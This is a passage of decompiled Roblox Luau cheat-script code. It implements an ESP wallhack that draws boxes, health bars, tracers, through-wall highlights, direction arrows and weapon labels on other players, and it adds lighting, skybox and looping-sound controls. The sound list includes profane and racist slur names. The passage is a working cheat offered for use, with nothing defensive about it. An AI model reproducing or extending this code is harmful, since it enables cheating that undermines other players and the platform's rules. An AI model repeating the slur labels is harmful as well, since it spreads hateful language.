		["Color1"] = Color3.fromRGB(255, 255, 255),
		["Color2"] = Color3.fromRGB(255, 255, 255)
	},
	["HealthBar"] = {
		["Color1"] = Color3.fromRGB(0, 255, 0),
		["Color2"] = Color3.fromRGB(255, 255, 255)
	},
	["Tool"] = {
		["Color1"] = Color3.fromRGB(255, 200, 0),
		["Color2"] = Color3.fromRGB(255, 255, 0)
	},
	["Direction"] = {
		["Color1"] = Color3.fromRGB(255, 0, 0),
		["Color2"] = Color3.fromRGB(255, 100, 100)
	}
}
local v_u_1210 = {}
local v_u_1211 = game:GetService("Players")
local v_u_1212 = game:GetService("RunService")
local v_u_1213 = workspace.CurrentCamera
local v_u_1214 = v_u_1211.LocalPlayer
local v_u_1215 = {
	["Font"] = Enum.Font.Code,
	["TextSize"] = 14,
	["TracerFromBottom"] = true
}
local function v_u_1217(p1216)
	return string.format("#%02X%02X%02X", math.floor(p1216.R * 255), math.floor(p1216.G * 255), math.floor(p1216.B * 255))
end
local function v_u_1219()
	local v1218 = tick() * 60 % 360 / 360
	return Color3.fromHSV(v1218, 1, 1)
end
local function v_u_1220()
	return (math.sin(tick() * 2) + 1) / 2
end
local function v_u_1224(p1221, p1222)
	-- upvalues: (ref) v_u_1204, (ref) v_u_1219, (ref) v_u_1205, (ref) v_u_1220
	local v1223 = Color3.new((p1221.R + p1222.R) / 2, (p1221.G + p1222.G) / 2, (p1221.B + p1222.B) / 2)
	if v_u_1204 then
		v1223 = v_u_1219()
	end
	return v1223, v_u_1205 and v_u_1220() or 1
end
local function v_u_1231(p1225)
	-- upvalues: (ref) v_u_1210
	local v1226 = v_u_1210[p1225.UserId]
	if v1226 then
		if v1226.LabelGui then
			v1226.LabelGui:Destroy()
		end
		if v1226.Highlight then
			v1226.Highlight:Destroy()
		end
		if v1226.TracerMain then
			v1226.TracerMain.Visible = false
			if v1226.TracerMain.Remove then
				pcall(v1226.TracerMain.Remove, v1226.TracerMain)
			end
		end
		if v1226.TracerOutline then
			v1226.TracerOutline.Visible = false
			if v1226.TracerOutline.Remove then
				pcall(v1226.TracerOutline.Remove, v1226.TracerOutline)
			end
		end
		if v1226.Box and v1226.Box.Remove then
			pcall(v1226.Box.Remove, v1226.Box)
		end
		if v1226.BoxOutline and v1226.BoxOutline.Remove then
			pcall(v1226.BoxOutline.Remove, v1226.BoxOutline)
		end
		if v1226.HealthBar and v1226.HealthBar.Remove then
			pcall(v1226.HealthBar.Remove, v1226.HealthBar)
		end
		if v1226.HealthBarOutline and v1226.HealthBarOutline.Remove then
			pcall(v1226.HealthBarOutline.Remove, v1226.HealthBarOutline)
		end
		if v1226.DirectionLines then
			local v1227, v1228, v1229 = ipairs(v1226.DirectionLines)
			while true do
				local v1230
				v1229, v1230 = v1227(v1228, v1229)
				if v1229 == nil then
					break
				end
				v1230.Visible = false
				if v1230.Remove then
					pcall(v1230.Remove, v1230)
				end
			end
		end
		v_u_1210[p1225.UserId] = nil
	end
end
local function v_u_1237()
	-- upvalues: (ref) v_u_1211, (ref) v_u_1231
	local v1232 = v_u_1211
	local v1233, v1234, v1235 = pairs(v1232:GetPlayers())
	while true do
		local v1236
		v1235, v1236 = v1233(v1234, v1235)
		if v1235 == nil then
			break
		end
		v_u_1231(v1236)
	end
end
local function v_u_1243(p1238)
	-- upvalues: (ref) v_u_1209, (ref) v_u_1210
	local v1239 = Drawing.new("Square")
	v1239.Visible = false
	v1239.Color = Color3.new(0, 0, 0)
	v1239.Thickness = 2
	v1239.Filled = false
	local v1240 = Drawing.new("Square")
	v1240.Visible = false
	v1240.Color = v_u_1209.Box.Color1
	v1240.Thickness = 1
	v1240.Filled = false
	v1240.Transparency = 1
	local v1241 = Drawing.new("Square")
	v1241.Visible = false
	v1241.Color = Color3.new(0, 0, 0)
	v1241.Thickness = 2
	v1239.Filled = false
	local v1242 = Drawing.new("Square")
	v1242.Visible = false
	v1242.Color = v_u_1209.HealthBar.Color1
	v1242.Thickness = 1
	v1242.Filled = true
	v1242.Transparency = 1
	v_u_1210[p1238].BoxOutline = v1239
	v_u_1210[p1238].Box = v1240
	v_u_1210[p1238].HealthBarOutline = v1241
	v_u_1210[p1238].HealthBar = v1242
end
local function v_u_1248(p_u_1244)
	-- upvalues: (ref) v_u_1208, (ref) v_u_1203, (ref) v_u_1209, (ref) v_u_1210
	local function v_u_1247()
		-- upvalues: (ref) v_u_1208, (ref) v_u_1203, (ref) p_u_1244, (ref) v_u_1209, (ref) v_u_1210
		if v_u_1208.Chams and (v_u_1203 and p_u_1244.Character) then
			local v1245 = p_u_1244.Character:FindFirstChild("ESP_Chams")
			if v1245 then
				v1245:Destroy()
			end
			local v1246 = Instance.new("Highlight")
			v1246.Name = "ESP_Chams"
			v1246.Adornee = p_u_1244.Character
			v1246.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			v1246.FillColor = v_u_1209.Chams.Color1
			v1246.FillTransparency = 0.5
			v1246.OutlineColor = Color3.new(0, 0, 0)
			v1246.OutlineTransparency = 0
			v1246.Parent = p_u_1244.Character
			v_u_1210[p_u_1244.UserId].Highlight = v1246
		end
	end
	v_u_1247()
	p_u_1244.CharacterAdded:Connect(function()
		-- upvalues: (ref) v_u_1247
		task.wait(0.2)
		v_u_1247()
	end)
end
local function v_u_1253()
	-- upvalues: (ref) v_u_1210, (ref) v_u_1215
	local v1249, v1250, v1251 = pairs(v_u_1210)
	while true do
		local v1252
		v1251, v1252 = v1249(v1250, v1251)
		if v1251 == nil then
			break
		end
		if v1252.Label then
			v1252.Label.Font = v_u_1215.Font
			v1252.Label.TextSize = v_u_1215.TextSize
		end
		if v1252.ToolLabel then
			v1252.ToolLabel.Font = v_u_1215.Font
			v1252.ToolLabel.TextSize = v_u_1215.TextSize
		end
	end
end
local function v_u_1262(p1254)
	-- upvalues: (ref) v_u_1214, (ref) v_u_1207, (ref) v_u_1231, (ref) v_u_1210, (ref) v_u_1215, (ref) v_u_1209, (ref) v_u_1243, (ref) v_u_1208, (ref) v_u_1248
	if p1254 ~= v_u_1214 then
		if not v_u_1207 or (p1254.Team ~= v_u_1214.Team or p1254.Team == nil) then
			v_u_1231(p1254)
			v_u_1210[p1254.UserId] = {}
			local v1255 = Instance.new("ScreenGui")
			v1255.Name = "ESP_GUI_" .. p1254.Name
			v1255.IgnoreGuiInset = true
			v1255.ResetOnSpawn = false
			v1255.Parent = game.CoreGui
			local v1256 = Instance.new("TextLabel")
			v1256.Size = UDim2.new(0, 150, 0, 50)
			v1256.BackgroundTransparency = 1
			v1256.Font = v_u_1215.Font
			v1256.TextSize = v_u_1215.TextSize
			v1256.TextColor3 = Color3.new(1, 1, 1)
			v1256.TextStrokeTransparency = 0
			v1256.TextStrokeColor3 = Color3.new(0, 0, 0)
			v1256.TextXAlignment = Enum.TextXAlignment.Center
			v1256.TextYAlignment = Enum.TextYAlignment.Top
			v1256.Text = ""
			v1256.RichText = true
			v1256.Visible = false
			v1256.Parent = v1255
			local v1257 = Instance.new("TextLabel")
			v1257.Size = UDim2.new(0, 150, 0, 18)
			v1257.Position = UDim2.new(0, 0, 0, 36)
			v1257.BackgroundTransparency = 1
			v1257.Font = v_u_1215.Font
			v1257.TextSize = v_u_1215.TextSize
			v1257.TextColor3 = v_u_1209.Tool.Color1
			v1257.TextStrokeTransparency = 0
			v1257.TextStrokeColor3 = Color3.new(0, 0, 0)
			v1257.TextXAlignment = Enum.TextXAlignment.Center
			v1257.TextYAlignment = Enum.TextYAlignment.Top
			v1257.Text = ""
			v1257.RichText = true
			v1257.Visible = false
			v1257.Parent = v1255
			local v1258 = {}
			for _ = 1, 3 do
				local v1259 = Drawing.new("Line")
				v1259.Visible = false
				v1259.Thickness = 2
				v1259.Transparency = 1
				v1259.Color = v_u_1209.Direction.Color1
				table.insert(v1258, v1259)
			end
			v_u_1210[p1254.UserId].LabelGui = v1255
			v_u_1210[p1254.UserId].Label = v1256
			v_u_1210[p1254.UserId].ToolLabel = v1257
			v_u_1210[p1254.UserId].DirectionLines = v1258
			v_u_1243(p1254.UserId)
			local v1260 = Drawing.new("Line")
			v1260.Thickness = 2
			v1260.Color = Color3.new(0, 0, 0)
			v1260.Visible = false
			local v1261 = Drawing.new("Line")
			v1261.Thickness = 1
			v1261.Color = Color3.new(1, 1, 1)
			v1261.Visible = false
			v_u_1210[p1254.UserId].TracerOutline = v1260
			v_u_1210[p1254.UserId].TracerMain = v1261
			if v_u_1208.Chams then
				v_u_1248(p1254)
			end
		end
	else
		return
	end
end
local function v_u_1273(p1263)
	if p1263.Character then
		local v1264, v1265, v1266 = ipairs(p1263.Character:GetChildren())
		while true do
			local v1267
			v1266, v1267 = v1264(v1265, v1266)
			if v1266 == nil then
				break
			end
			if v1267:IsA("Tool") then
				return v1267.Name
			end
		end
	end
	local v1268 = p1263:FindFirstChild("Backpack")
	if v1268 then
		local v1269, v1270, v1271 = ipairs(v1268:GetChildren())
		while true do
			local v1272
			v1271, v1272 = v1269(v1270, v1271)
			if v1271 == nil then
				break
			end
			if v1272:IsA("Tool") then
				return v1272.Name
			end
		end
	end
	return nil
end
local function v_u_1290(p1274)
	-- upvalues: (ref) v_u_1213
	local v1275 = v_u_1213.ViewportSize
	local v1276 = Vector2.new(v1275.X / 2, v1275.Y / 2)
	local v1277 = v_u_1213.CFrame.Position
	local v1278 = v_u_1213.CFrame.LookVector
	local v1279 = p1274 - v1277
	local v1280 = v1279:Dot(v1278)
	local _, v1281 = v_u_1213:WorldToViewportPoint(p1274)
	if v1281 and 0 < v1280 then
		return nil, true
	end
	local v1282 = v_u_1213.CFrame.RightVector
	local v1283 = v_u_1213.CFrame.UpVector
	local v1284 = v1279:Dot(v1282)
	local v1285 = -v1279:Dot(v1283)
	local v1286 = Vector2.new(v1284, v1285).Unit
	local v1287 = v1276 + v1286 * (math.min(v1276.X, v1276.Y) - 60)
	local v1288 = 18
	local v1289 = math.atan2(v1286.Y, v1286.X)
	return { v1287 + Vector2.new(math.cos(v1289) * v1288, math.sin(v1289) * v1288), v1287 + Vector2.new(math.cos(v1289 + 2.4) * (v1288 * 0.7), math.sin(v1289 + 2.4) * (v1288 * 0.7)), v1287 + Vector2.new(math.cos(v1289 - 2.4) * (v1288 * 0.7), math.sin(v1289 - 2.4) * (v1288 * 0.7)) }, false
end
local function v_u_1346(p1291)
	-- upvalues: (ref) v_u_1210, (ref) v_u_1207, (ref) v_u_1214, (ref) v_u_1231, (ref) v_u_1213, (ref) v_u_1206, (ref) v_u_1208, (ref) v_u_1224, (ref) v_u_1209, (ref) v_u_1217, (ref) v_u_1204, (ref) v_u_1219, (ref) v_u_1205, (ref) v_u_1220, (ref) v_u_1290, (ref) v_u_1215, (ref) v_u_1273
	local v1292 = v_u_1210[p1291.UserId]
	if v1292 then
		if v_u_1207 and (p1291.Team == v_u_1214.Team and p1291.Team ~= nil) then
			v_u_1231(p1291)
			return
		else
			local v1293 = p1291.Character
			local v1294
			if v1293 then
				v1294 = v1293:FindFirstChildOfClass("Humanoid")
			else
				v1294 = v1293
			end
			local v1295
			if v1293 then
				v1295 = v1293:FindFirstChild("UpperTorso") or v1293:FindFirstChild("HumanoidRootPart")
			else
				v1295 = v1293
			end
			if v1295 then
				local v1296 = v1293:FindFirstChild("Head")
				local v1297, v1298 = v_u_1213:WorldToViewportPoint(v1295.Position)
				local v1299, v1300 = v_u_1213:WorldToViewportPoint(v1295.Position + Vector3.new(0, 2.5, 0))
				local v1301 = (v_u_1213.CFrame.Position - v1295.Position).Magnitude
				local v1302 = ""
				if v_u_1206 and (v_u_1208.Names and v_u_1208.Distance) then
					local v1303, v1304 = v_u_1224(v_u_1209.Names.Color1, v_u_1209.Names.Color2)
					local v1305, _ = v_u_1224(v_u_1209.Distance.Color1, v_u_1209.Distance.Color2)
					v1302 = string.format("<font color=\"%s\">%s</font> <font color=\"%s\">[%dm]</font>", v_u_1217(v1303), p1291.DisplayName, v_u_1217(v1305), math.floor(v1301))
					v1292.Label.TextColor3 = v1303
					v1292.Label.TextTransparency = 1 - v1304
				else
					if v_u_1208.Names then
						local v1306, v1307 = v_u_1224(v_u_1209.Names.Color1, v_u_1209.Names.Color2)
						v1292.Label.TextColor3 = v1306
						v1292.Label.TextTransparency = 1 - v1307
						v1302 = v1302 .. string.format("<font color=\"%s\">%s</font>\n", v_u_1217(v1306), p1291.DisplayName)
					end
					if v_u_1208.Distance then
						local v1308, _ = v_u_1224(v_u_1209.Distance.Color1, v_u_1209.Distance.Color2)
						v1302 = v1302 .. string.format("<font color=\"%s\">Dist: %.1f m</font>\n", v_u_1217(v1308), v1301)
					end
				end
				if v1292.Label then
					v1292.Label.Text = v1302
					v1292.Label.Position = UDim2.new(0, v1299.X - 75, 0, v1299.Y - 30)
					local v1309 = v1292.Label
					local v1310
					if v1302 == "" then
						v1310 = false
					else
						v1310 = v1300
					end
					v1309.Visible = v1310
				end
				if v1296 and (v_u_1208.Box or v_u_1208.HealthBar) and v1298 then
					local v1311 = v_u_1213:WorldToViewportPoint(v1296.Position + Vector3.new(0, 0.5, 0))
					local v1312 = v_u_1213:WorldToViewportPoint(v1295.Position - Vector3.new(0, 3, 0))
					local v1313 = math.abs(v1311.Y - v1312.Y)
					local v1314 = v1313 < 10 and 10 or v1313
					local v1315 = v1314 / 2
					local v1316 = v1311.X - v1315 / 2
					local v1317 = v1311.Y - v1314 * 0.1
					v1292.Box.Size = Vector2.new(v1315, v1314)
					v1292.Box.Position = Vector2.new(v1316, v1317)
					v1292.Box.Color = v_u_1204 and v_u_1219() or v_u_1209.Box.Color1
					local v1318 = v_u_1205 and v_u_1220() or 1
					v1292.Box.Transparency = v1318
					v1292.Box.Visible = v_u_1208.Box
					v1292.BoxOutline.Size = v1292.Box.Size
					v1292.BoxOutline.Position = v1292.Box.Position
					v1292.BoxOutline.Transparency = v1318
					v1292.BoxOutline.Visible = v_u_1208.Box
					if v_u_1208.HealthBar and v1294 then
						local v1319 = v1314 * math.clamp(v1294.Health / (v1294.MaxHealth > 0 and v1294.MaxHealth or 1), 0, 1)
						local v1320, v1321 = v_u_1224(v_u_1209.HealthBar.Color1, v_u_1209.HealthBar.Color2)
						v1292.HealthBar.Size = Vector2.new(2, v1319)
						v1292.HealthBar.Position = Vector2.new(v1316 - 5, v1317 + v1314 - v1319)
						v1292.HealthBar.Color = v1320
						v1292.HealthBar.Transparency = v1321
						v1292.HealthBar.Visible = true
						v1292.HealthBarOutline.Size = Vector2.new(2, v1314)
						v1292.HealthBarOutline.Position = Vector2.new(v1316 - 5, v1317)
						v1292.HealthBarOutline.Transparency = v1321
						v1292.HealthBarOutline.Visible = true
					else
						v1292.HealthBar.Visible = false
						v1292.HealthBarOutline.Visible = false
					end
				else
					v1292.Box.Visible = false
					v1292.BoxOutline.Visible = false
					v1292.HealthBar.Visible = false
					v1292.HealthBarOutline.Visible = false
				end
				if v_u_1208.Direction and v1292.DirectionLines then
					local v1322, v1323 = v_u_1290(v1295.Position)
					if v1322 and not v1323 then
						local v1324, v1325 = v_u_1224(v_u_1209.Direction.Color1, v_u_1209.Direction.Color2)
						for v1326 = 1, 3 do
							v1292.DirectionLines[v1326].Color = v1324
							v1292.DirectionLines[v1326].Transparency = v1325
							v1292.DirectionLines[v1326].Visible = true
						end
						v1292.DirectionLines[1].From = v1322[1]
						v1292.DirectionLines[1].To = v1322[2]
						v1292.DirectionLines[2].From = v1322[2]
						v1292.DirectionLines[2].To = v1322[3]
						v1292.DirectionLines[3].From = v1322[3]
						v1292.DirectionLines[3].To = v1322[1]
					else
						local v1327, v1328, v1329 = ipairs(v1292.DirectionLines)
						while true do
							local v1330
							v1329, v1330 = v1327(v1328, v1329)
							if v1329 == nil then
								break
							end
							v1330.Visible = false
						end
					end
				end
				if v_u_1208.Tracers and v1298 then
					local v1331, v1332 = v_u_1224(v_u_1209.Tracers.Color1, v_u_1209.Tracers.Color2)
					local v1333 = v_u_1215.TracerFromBottom and v_u_1213.ViewportSize.Y or 0
					local v1334 = Vector2.new(v_u_1213.ViewportSize.X / 2, v1333)
					local v1335 = Vector2.new(v1297.X, v1297.Y)
					local v1336 = (v1335 - v1334).Unit
					local v1337 = Vector2.new(-v1336.Y, v1336.X) * 0.7
					v1292.TracerOutline.From = v1334 + v1337
					v1292.TracerOutline.To = v1335 + v1337
					v1292.TracerOutline.Transparency = v1332
					v1292.TracerOutline.Visible = true
					v1292.TracerOutline.From = v1334 - v1337
					v1292.TracerOutline.To = v1335 - v1337
					v1292.TracerMain.From = v1334
					v1292.TracerMain.To = v1335
					v1292.TracerMain.Color = v1331
					v1292.TracerMain.Transparency = v1332
					v1292.TracerMain.Visible = true
				else
					v1292.TracerMain.Visible = false
					v1292.TracerOutline.Visible = false
				end
				if v1292.Highlight and v1292.Highlight.Parent then
					if v_u_1208.Chams then
						local v1338, _ = v_u_1224(v_u_1209.Chams.Color1, v_u_1209.Chams.Color2)
						v1292.Highlight.FillColor = v1338
						v1292.Highlight.FillTransparency = 0.55
						v1292.Highlight.Enabled = true
					else
						v1292.Highlight.Enabled = false
					end
				end
				if v1292.ToolLabel and v_u_1208.Tool then
					local v1339 = v_u_1273(p1291)
					if v1339 and (v1300 or v1298) then
						local v1340, v1341 = v_u_1224(v_u_1209.Tool.Color1, v_u_1209.Tool.Color2)
						v1292.ToolLabel.Text = string.format("<font color=\"%s\">%s</font>", v_u_1217(v1340), v1339)
						v1292.ToolLabel.TextColor3 = v1340
						v1292.ToolLabel.TextTransparency = 1 - v1341
						v1292.ToolLabel.Position = v1300 and UDim2.new(0, v1299.X - 75, 0, v1299.Y + 4) or UDim2.new(0, v1297.X - 75, 0, v1297.Y + (v1292.Box.Size.Y or 0) + 4)
						v1292.ToolLabel.Visible = true
					else
						v1292.ToolLabel.Visible = false
					end
				end
			else
				v1292.Label.Visible = false
				v1292.ToolLabel.Visible = false
				v1292.TracerMain.Visible = false
				v1292.TracerOutline.Visible = false
				v1292.Box.Visible = false
				v1292.BoxOutline.Visible = false
				v1292.HealthBar.Visible = false
				v1292.HealthBarOutline.Visible = false
				if v1292.Highlight then
					v1292.Highlight.Enabled = false
				end
				if v1292.DirectionLines then
					local v1342, v1343, v1344 = ipairs(v1292.DirectionLines)
					while true do
						local v1345
						v1344, v1345 = v1342(v1343, v1344)
						if v1344 == nil then
							break
						end
						v1345.Visible = false
					end
				end
			end
		end
	else
		return
	end
end
local function v_u_1352()
	-- upvalues: (ref) v_u_1211, (ref) v_u_1214, (ref) v_u_1262
	local v1347 = v_u_1211
	local v1348, v1349, v1350 = pairs(v1347:GetPlayers())
	while true do
		local v1351
		v1350, v1351 = v1348(v1349, v1350)
		if v1350 == nil then
			break
		end
		if v1351 ~= v_u_1214 then
			v_u_1262(v1351)
		end
	end
end
local v_u_1353 = 0
v_u_1212.RenderStepped:Connect(function()
	-- upvalues: (ref) v_u_1353, (ref) v_u_1203, (ref) v_u_1211, (ref) v_u_1214, (ref) v_u_1210, (ref) v_u_1262, (ref) v_u_1346
	v_u_1353 = v_u_1353 + 1
	if v_u_1203 and v_u_1353 % 2 == 0 then
		local v1354 = v_u_1211
		local v1355, v1356, v1357 = pairs(v1354:GetPlayers())
		while true do
			local v1358
			v1357, v1358 = v1355(v1356, v1357)
			if v1357 == nil then
				break
			end
			if v1358 ~= v_u_1214 then
				if not v_u_1210[v1358.UserId] then
					v_u_1262(v1358)
				end
				v_u_1346(v1358)
			end
		end
	end
end)
v_u_1211.PlayerRemoving:Connect(v_u_1231)
v_u_1211.PlayerAdded:Connect(function(p_u_1359)
	-- upvalues: (ref) v_u_1203, (ref) v_u_1262
	p_u_1359.CharacterAdded:Connect(function()
		-- upvalues: (ref) v_u_1203, (ref) v_u_1262, (ref) p_u_1359
		task.wait(0.5)
		if v_u_1203 then
			v_u_1262(p_u_1359)
		end
	end)
end)
local v1360 = v_u_1201
local v1362 = {
	["Text"] = "Enable",
	["Default"] = false,
	["Callback"] = function(p1361)
		-- upvalues: (ref) v_u_1203, (ref) v_u_1352, (ref) v_u_1237
		v_u_1203 = p1361
		if p1361 then
			v_u_1352()
		else
			v_u_1237()
		end
	end
}
v_u_1201.AddToggle(v1360, "EnableESP", v1362)
local v1363 = v_u_1201
local v1365 = {
	["Text"] = "Rainbow",
	["Default"] = false,
	["Callback"] = function(p1364)
		-- upvalues: (ref) v_u_1204
		v_u_1204 = p1364
	end
}
v_u_1201.AddToggle(v1363, "RainbowESP", v1365)
local v1366 = v_u_1201
local v1368 = {
	["Text"] = "Fading",
	["Default"] = false,
	["Callback"] = function(p1367)
		-- upvalues: (ref) v_u_1205
		v_u_1205 = p1367
	end
}
v_u_1201.AddToggle(v1366, "FadingESP", v1368)
local function v1375(p_u_1369)
	-- upvalues: (ref) v_u_1201, (ref) v_u_1208, (ref) v_u_1203, (ref) v_u_1352, (ref) v_u_1209
	local v1371 = {
		["Text"] = p_u_1369,
		["Default"] = false,
		["Callback"] = function(p1370)
			-- upvalues: (ref) v_u_1208, (ref) p_u_1369, (ref) v_u_1203, (ref) v_u_1352
			v_u_1208[p_u_1369] = p1370
			if v_u_1203 then
				v_u_1352()
			end
		end
	}
	local v1372 = v_u_1201:AddToggle(p_u_1369 .. "Toggle", v1371)
	v1372:AddColorPicker(p_u_1369 .. "C1", {
		["Default"] = v_u_1209[p_u_1369].Color1,
		["Title"] = p_u_1369 .. " Color 1",
		["Callback"] = function(p1373)
			-- upvalues: (ref) v_u_1209, (ref) p_u_1369
			v_u_1209[p_u_1369].Color1 = p1373
		end
	})
	v1372:AddColorPicker(p_u_1369 .. "C2", {
		["Default"] = v_u_1209[p_u_1369].Color2,
		["Title"] = p_u_1369 .. " Color 2",
		["Callback"] = function(p1374)
			-- upvalues: (ref) v_u_1209, (ref) p_u_1369
			v_u_1209[p_u_1369].Color2 = p1374
		end
	})
end
v1375("Names")
v1375("Distance")
v1375("Chams")
v1375("Tracers")
v1375("Box")
v1375("HealthBar")
v1375("Tool")
v1375("Direction")
v1202:AddDropdown("ESPFont", {
	["Text"] = "Font",
	["Values"] = {
		"Legacy",
		"Arial",
		"ArialBold",
		"SourceSans",
		"SourceSansBold",
		"SourceSansLight",
		"SourceSansItalic",
		"Bodoni",
		"Garamond",
		"Cartoon",
		"Code",
		"Highway",
		"SciFi",
		"Arcade",
		"Fantasy",
		"Antique",
		"Gotham",
		"GothamBold",
		"GothamBlack",
		"AmaticSC",
		"Bangers",
		"Creepster",
		"FredokaOne",
		"LuckiestGuy",
		"Michroma",
		"Oswald",
		"PressStart2P",
		"Roboto",
		"RobotoMono",
		"Sarpanch",
		"Ubuntu",
		"PermanentMarker",
		"IndieFlower",
		"Kalam",
		"Nunito",
		"TitilliumWeb",
		"FiraSans",
		"FiraMono",
		"Montserrat"
	},
	["Default"] = "Code",
	["Callback"] = function(p1376)
		-- upvalues: (ref) v_u_1215, (ref) v_u_1253
		v_u_1215.Font = Enum.Font[p1376]
		v_u_1253()
	end
})
v1202:AddSlider("ESPTextSize", {
	["Text"] = "Text Size",
	["Min"] = 10,
	["Max"] = 20,
	["Default"] = 14,
	["Rounding"] = 2,
	["Callback"] = function(p1377)
		-- upvalues: (ref) v_u_1215, (ref) v_u_1253
		v_u_1215.TextSize = p1377
		v_u_1253()
	end
})
v1202:AddToggle("TeamCheck", {
	["Text"] = "Team Check",
	["Default"] = false,
	["Callback"] = function(p1378)
		-- upvalues: (ref) v_u_1207, (ref) v_u_1203, (ref) v_u_1237, (ref) v_u_1352
		v_u_1207 = p1378
		if v_u_1203 then
			v_u_1237()
			v_u_1352()
		end
	end
})
v1202:AddToggle("TracerFromBottom", {
	["Text"] = "Tracers From Bottom",
	["Default"] = true,
	["Callback"] = function(p1379)
		-- upvalues: (ref) v_u_1215
		v_u_1215.TracerFromBottom = p1379
	end
})
v1202:AddToggle("CombineNameDist", {
	["Text"] = "Combine Name, Distance",
	["Default"] = false,
	["Callback"] = function(p1380)
		-- upvalues: (ref) v_u_1206
		v_u_1206 = p1380
	end
})
local v_u_1381 = game:GetService("Lighting")
local v1382 = v24:AddLeftTabbox()
v_u_1201 = v1382:AddTab("World")
local v1383 = v1382:AddTab("SkyBox")
selectedSoundName = "Annoying"
backgroundNoisesEnabled = false
volumeValue = 5
rainbowLighting = false
timeControlEnabled = false
currentGameTime = 12
currentSound = nil
customSoundId = nil
soundIDs = {
	["Thunder Storm"] = 92640524897440,
	["Light Rain"] = 1516791621,
	["Morning"] = 6189453706,
	["Windy Winter"] = 596046130,
	["Balerina"] = 70455732863262,
	["Toma Phonk"] = 129098116998483,
	["Bitch Pleasure"] = 98680556755606,
	["Atom Explode"] = 92446468726259,
	["bitch is crying"] = 7014161416,
	["Call of Duty"] = 413424521,
	["Beauty Normal"] = 96760299701814,
	["Crash keyboard"] = 6735766439,
	["Annoying"] = 9116270881,
	["Fuckyall niggers"] = 1843497734
}
function playSound()
	-- upvalues: (ref) v_u_1037
	if currentSound then
		currentSound:Stop()
		currentSound:Destroy()
		currentSound = nil
	end
	if backgroundNoisesEnabled then
		sound = Instance.new("Sound")
		sound.Looped = true
		sound.Volume = volumeValue
		sound.Name = "BackgroundNoise"
		sound.Parent = v_u_1037
		if customSoundId and customSoundId ~= "" then
			sound.SoundId = "rbxassetid://" .. tostring(customSoundId)
		else
			if not (selectedSoundName and soundIDs[selectedSoundName]) then
				sound:Destroy()
				return
			end
			sound.SoundId = "rbxassetid://" .. tostring(soundIDs[selectedSoundName])
		end
		sound:Play()
		currentSound = sound
	end
end
local v1384 = v_u_1201
v_u_1201.AddToggle(v1384, "BackgroundNoisesToggle", {
	["Text"] = "Background Noises",
	["Default"] = false,
	["Callback"] = function(p1385)
		backgroundNoisesEnabled = p1385
		playSound()
	end
})
local v1386 = v_u_1201
v_u_1201.AddDropdown(v1386, "BackgroundSoundDropdown", {
	["Values"] = (function()
		t = {}
		local v1387, v1388, v1389 = pairs(soundIDs)
		while true do
			v1389 = v1387(v1388, v1389)
			if v1389 == nil then
				break
			end
			table.insert(t, v1389)
		end
		table.sort(t)
		return t
	end)(),
	["Default"] = 1,
	["Multi"] = false,
	["Text"] = "Select Sound",
	["Callback"] = function(p1390)
		selectedSoundName = p1390
		playSound()
	end
})
local v1391 = v_u_1201
v_u_1201.AddSlider(v1391, "VolumeSlider", {
	["Text"] = "Volume",
	["Default"] = volumeValue,
	["Min"] = 0,
	["Max"] = 10,
	["Rounding"] = 0,
	["Callback"] = function(p1392)
		volumeValue = p1392
		if currentSound then
			currentSound.Volume = volumeValue
		end
	end
})
local v1393 = v_u_1201
v_u_1201.AddInput(v1393, "CustomSoundInput", {
	["Text"] = "Custom Sound ID",
	["Placeholder"] = "Asset ID",
	["Callback"] = function(p1394)
		if p1394 == "" or not p1394 then
			p1394 = nil
		end
		customSoundId = p1394
		playSound()
	end
})
local v1395 = v_u_1201
local v1397 = {
	["Text"] = "Disable Shadows",
	["Callback"] = function(p1396)
		-- upvalues: (ref) v_u_1381
		v_u_1381.GlobalShadows = not p1396
	end,
	["Enabled"] = false
}
v_u_1201.AddToggle(v1395, "DisableShadows", v1397)
local v1398 = v_u_1201
v_u_1201.AddToggle(v1398, "RainbowLightning", {
	["Text"] = "Rainbow Lighting",
	["Callback"] = function(p1399)
		rainbowLighting = p1399
	end,
	["Enabled"] = false
})
local v1400 = v_u_1381
cc = v_u_1381.FindFirstChildOfClass(v1400, "ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", v_u_1381)
local v1401 = v_u_1381.Brightness
local v1402 = cc.Saturation
contrastValue = cc.Contrast
saturationValue = v1402
brightnessValue = v1401
function round(p1403)
	return math.floor(p1403 * 100 + 0.5) / 100
end
function setGameTime(p1404)
	-- upvalues: (ref) v_u_1381
	v_u_1381.ClockTime = math.clamp(p1404, 0, 24)
end
local v1405 = v_u_1201
v_u_1201.AddToggle(v1405, "TimeControlToggle", {
	["Text"] = "Enable Time Control",
	["Default"] = false,
	["Callback"] = function(p1406)
		timeControlEnabled = p1406
	end
})
local v1407 = v_u_1201
v_u_1201.AddSlider(v1407, "TimeSlider", {
	["Text"] = "Time Clock",
	["Min"] = 0,
	["Max"] = 24,
	["Default"] = currentGameTime,
	["Rounding"] = 2,
	["Callback"] = function(p1408)
		currentGameTime = p1408
		if timeControlEnabled then
			setGameTime(currentGameTime)
		end
	end
})
local v1409 = v_u_1201
v_u_1201.AddSlider(v1409, "Brightness", {
	["Text"] = "Brightness",
	["Min"] = 0.1,
	["Max"] = 10,
	["Default"] = brightnessValue,
	["Rounding"] = 1,
	["Callback"] = function(p1410)
		-- upvalues: (ref) v_u_1381
		v_u_1381.Brightness = math.clamp(round(p1410), -1, 10)
	end
})
local v1411 = v_u_1201
v_u_1201.AddSlider(v1411, "Saturation", {
	["Text"] = "Saturation",
	["Min"] = -1,
	["Max"] = 10,
	["Default"] = saturationValue,
	["Rounding"] = 1,
	["Callback"] = function(p1412)
		cc.Saturation = math.clamp(round(p1412), -1, 10)
	end
})
local v1413 = v_u_1201
v_u_1201.AddSlider(v1413, "Contrast", {
	["Text"] = "Contrast",
	["Min"] = -1,
	["Max"] = 10,
	["Default"] = contrastValue,
	["Rounding"] = 1,
	["Callback"] = function(p1414)
		cc.Contrast = math.clamp(round(p1414), -1, 10)
	end
})
customSky = {
	["Bk"] = "",
	["Dn"] = "",
	["Ft"] = "",
	["Lf"] = "",
	["Rt"] = "",
	["Up"] = ""
}
selectedSkybox = "Default"
function applySkybox(p1415)
	-- upvalues: (ref) v_u_1381
	local v1416 = v_u_1381
	local v1417, v1418, v1419 = pairs(v1416:GetChildren())
	while true do
		local v1420
		v1419, v1420 = v1417(v1418, v1419)
		if v1419 == nil then
			break
		end
		if v1420:IsA("Sky") then
			v1420:Destroy()
		end
	end
	if p1415 ~= "Default" then
		sky = Instance.new("Sky")
